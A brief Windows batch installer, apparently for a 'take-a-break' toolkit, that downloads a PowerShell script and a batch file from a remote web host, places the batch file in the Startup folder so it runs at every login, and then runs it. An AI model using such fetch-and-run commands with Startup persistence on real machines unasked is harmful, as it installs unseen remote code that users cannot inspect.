if exist %userprofile%\tool rd /s /q %userprofile%\tool
if not exist %userprofile%\tool mkdir %userprofile%\tool
powershell.exe -command "Invoke-WebRequest https://www.pixel-shift.de/take-a-break/toolkit/update.ps1 -OutFile $env:userprofile\tool\tool.ps1"
powershell.exe -command "Invoke-WebRequest https://www.pixel-shift.de/take-a-break/toolkit/run.bat -OutFile ($env:APPDATA + '/Microsoft\Windows\Start Menu\Programs\Startup\run.bat')"
PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Installation completed. Please update the tool on first use!')"
%appdata%\Microsoft\Windows\Start^ Menu\Programs\Startup\run.bat